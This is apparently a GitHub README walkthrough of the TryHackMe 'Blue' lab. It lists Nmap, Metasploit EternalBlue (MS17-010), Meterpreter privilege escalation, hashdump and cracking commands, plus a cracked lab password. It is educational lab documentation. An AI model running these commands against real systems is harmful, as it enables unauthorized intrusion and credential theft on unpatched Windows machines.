# TryHackMe Blue Walkthrough

## Overview

This repository contains my penetration testing walkthrough and report for the TryHackMe Blue room. The objective was to identify and exploit the MS17-010 (EternalBlue) vulnerability, gain system access, perform privilege escalation, extract password hashes, crack credentials, and retrieve all system flags.

## Room Information

* Platform: TryHackMe
* Room: Blue
* Difficulty: Easy
* Target OS: Windows 7 / Windows Server 2008 R2
* Vulnerability: MS17-010 (EternalBlue)

## Objectives

* Perform reconnaissance and service enumeration
* Identify vulnerabilities
* Exploit the target using EternalBlue
* Gain a Meterpreter session
* Escalate privileges to SYSTEM
* Extract and crack password hashes
* Locate and retrieve all flags

## Tools Used

| Tool                 | Purpose                                           |
| -------------------- | ------------------------------------------------- |
| Nmap                 | Network reconnaissance and vulnerability scanning |
| Metasploit Framework | Exploitation and post-exploitation                |
| Meterpreter          | Post-exploitation activities                      |
| John the Ripper      | Password hash cracking                            |
| Kali Linux           | Attacking platform                                |

## Methodology

### 1. Reconnaissance

Performed an Nmap scan to identify open ports and services.

```bash
nmap -sC -sV -Pn --script vuln <TARGET-IP>
```

Findings:

* TCP 135 – MSRPC
* TCP 139 – NetBIOS
* TCP 445 – SMB

The scan identified the host as vulnerable to:

```text
MS17-010 (EternalBlue)
```

### 2. Exploitation

Started Metasploit and selected the EternalBlue exploit module.

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Configured:

```bash
set RHOSTS <TARGET-IP>
run
```

Successful exploitation resulted in a Meterpreter session.

### 3. Privilege Escalation

Verified SYSTEM privileges and migrated to a stable process.

Commands used:

```bash
getsystem
whoami
ps
migrate <PID>
```

### 4. Hash Extraction and Cracking

Dumped SAM hashes using:

```bash
hashdump
```

Extracted user account:

```text
Jon
```

Cracked password:

```text
alqfna2
```

### 5. Flag Discovery

Located all flags using Meterpreter search functionality.

```bash
search -f flag*.txt
```

Retrieved:

* Flag 1
* Flag 2
* Flag 3

## Screenshots

Screenshots for each stage of the assessment are located in the `/screenshots` directory.

Examples:

* Nmap Enumeration
* Vulnerability Detection
* Exploit Execution
* Meterpreter Session
* Hashdump
* Flag Retrieval

## Skills Demonstrated

* Network Enumeration
* Vulnerability Assessment
* Exploitation
* Post-Exploitation
* Windows Privilege Escalation
* Credential Access
* Password Cracking
* Documentation and Reporting

## Disclaimer

This project was completed within a legal lab environment provided by TryHackMe for educational and ethical hacking purposes only.

## Author

Frank Kofi Awen

* GitHub: https://github.com/faceless122/tryhackme-blue-walkthrough.git
* LinkedIn: www.linkedin.com/in/awenfrank

## References

* Microsoft MS17-010 Security Bulletin
* Metasploit Framework Documentation
* TryHackMe Blue Room
